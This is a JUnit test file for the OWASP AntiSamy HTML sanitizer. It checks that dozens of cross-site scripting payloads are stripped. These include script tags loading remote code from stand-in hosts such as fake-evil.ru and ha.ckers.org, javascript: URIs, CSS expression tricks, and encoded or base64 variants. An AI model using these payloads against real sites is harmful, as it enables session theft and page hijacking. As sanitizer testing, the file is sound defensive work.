package org.owasp.validator.html.test;

import java.util.Arrays;

import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.Policy;


import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;

import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.Policy;

/**
 * This class tests AntiSamy functionality and the basic policy file which should be immune to XSS and 
 * CSS phishing attacks.
 * 
 * @author Arshan Dabirsiaghi
 *
 */

public class AntiSamyTest extends TestCase {

	private AntiSamy as = new AntiSamy();
	private Policy policy = null;
	
	public AntiSamyTest (String s) { super(s); }
	
	protected void setUp() throws Exception {
		
		/*
		 * Load the policy. You may have to change the path to find the Policy file.
		 */
		
		policy = Policy.getInstance("resources/antisamy-1.2.xml");
				
	}
	
	protected void tearDown() throws Exception { }
	
	public static Test suite() {
		
		TestSuite suite = new TestSuite(AntiSamyTest.class);
		return suite;
		
	}
	
	/*
	public void test() {
		
		testScriptAttacks();
		testImgAttacks();
		testHrefAttacks();
		
	}
	*/
	
	/*
	 * Test basic XSS cases. 
	 */
	
	public void testScriptAttacks() {
		try {
			
			assertTrue ( as.scan("test<script>alert(document.cookie)</script>",policy).getCleanHTML().indexOf("script") ==  -1);
			assertTrue ( as.scan("<<<><<script src=http://fake-evil.ru/test.js>",policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<script<script src=http://fake-evil.ru/test.js>>",policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",policy).getCleanHTML().indexOf("onload") == -1 );
			assertTrue ( as.scan("<BODY ONLOAD=alert('XSS')>",policy).getCleanHTML().indexOf("alert") == -1 );
			
			assertTrue ( as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <",policy).getCleanHTML().indexOf("<iframe") == -1 );
			assertTrue ( as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("src") == -1 );
			
			
		} catch (Exception e) {
			fail("Caught exception in testScriptAttack(): "+e.getMessage());
		}
		
	}
	
	public void testImgAttacks() {
		
		try {
		
			assertTrue ( as.scan("<img src='http://www.myspace.com/img.gif'>",policy).getCleanHTML().indexOf("<img") != -1);
			assertTrue ( as.scan("<img src=javascript:alert(document.cookie)>",policy).getCleanHTML().indexOf("<img") == -1);
			assertTrue ( as.scan("<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",policy).getCleanHTML().indexOf("<img") == -1 );
			assertTrue ( as.scan("<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",policy).getCleanHTML().indexOf("&amp;") != -1 );
			assertTrue ( as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",policy).getCleanHTML().indexOf("&amp;") != -1 );
			assertTrue ( as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",policy).getCleanHTML().indexOf("alert") == -1 );
			assertTrue ( as.scan("<IMG SRC=\"javascript:alert('XSS')\"",policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">",policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("javascript") == -1 );
			
			
		} catch(Exception e) {
			fail("Caught exception in testImgSrcAttacks(): "+e.getMessage());
		}
	}
	
	
	public void testHrefAttacks() {
		
		try {	
			
			assertTrue ( as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("href") == -1 );
			assertTrue ( as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">",policy).getCleanHTML().indexOf("href") == -1 );
			assertTrue ( as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",policy).getCleanHTML().indexOf("ha.ckers.org") == -1 );
			assertTrue ( as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",policy).getCleanHTML().indexOf("ha.ckers.org") == -1 );
			
			assertTrue ( as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",policy).getCleanHTML().indexOf("xss.htc") == -1 );
			
			assertTrue ( as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",policy).getCleanHTML().indexOf("javascript") == -1 );
			
			
			assertTrue ( as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>",policy).getCleanHTML().indexOf("vbscript") == -1 );
			
			//assertTrue ( as.scan("¼script¾alert(¢XSS¢)¼/script¾",policy).getCleanHTML().indexOf("¼") == -1 );
			
			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",policy).getCleanHTML().indexOf("<meta") == -1 );


			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy).getCleanHTML().indexOf("<meta") == -1 );
			assertTrue ( as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy).getCleanHTML().indexOf("<meta") == -1 );
			assertTrue ( as.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy).getCleanHTML().indexOf("iframe") == -1 );
			assertTrue ( as.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy).getCleanHTML().indexOf("background") == -1 );
			assertTrue ( as.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy).getCleanHTML().indexOf("background") == -1 );
			assertTrue ( as.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy).getCleanHTML().indexOf("alert") == -1 );
			assertTrue ( as.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy).getCleanHTML().indexOf("alert") == -1 );
			assertTrue ( as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).getCleanHTML().indexOf("ript:alert") == -1 );
			assertTrue ( as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).getCleanHTML().indexOf("<base") == -1 );
			
			assertTrue ( as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).getCleanHTML().indexOf("<object") == -1 );
			assertTrue ( as.scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).getCleanHTML().indexOf("<object") == -1 );
			assertTrue ( as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().indexOf("<embed") == -1 );
			assertTrue ( as.scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).getCleanHTML().indexOf("<embed") == -1 );
			
			assertTrue ( as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );

			assertTrue ( as.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("<script") == -1 );
			assertTrue ( as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).getCleanHTML().indexOf("script") == -1 );
			assertTrue ( as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js",policy).getCleanHTML().indexOf("<script") == -1 );
			
			assertTrue ( as.scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>", policy).getCleanHTML().indexOf("style") == -1 );
			
			assertTrue ( as.scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>",policy).getCleanHTML().indexOf("aim.exe") == -1 );
			assertTrue ( as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->",policy).getCleanHTML().indexOf("javascript") == -1 );
			assertTrue ( as.scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">",policy).getCleanHTML().indexOf("document") == -1 );
						
		} catch(Exception e) {
			fail("Caught exception in testHrefSrcAttacks(): "+e.getMessage());
		}
	}
	
	/*
	 * Test CSS protections. 
	 */
	
	public void testCssAttacks() {
	    try {
		assertTrue ( as.scan("<div style=\"position:absolute\">",policy).getCleanHTML().indexOf("position") == -1 );
		assertTrue ( as.scan("<style>b { position:absolute }</style>",policy).getCleanHTML().indexOf("position") == -1 );
		assertTrue ( as.scan("<div style=\"z-index:25\">",policy).getCleanHTML().indexOf("position") == -1 );
		assertTrue ( as.scan("<style>z-index:25</style>",policy).getCleanHTML().indexOf("position") == -1 );		
	    } catch (Exception e) {
		fail("Caught exception in testCssAttacks(): "+e.getMessage());		
	    }
	}

}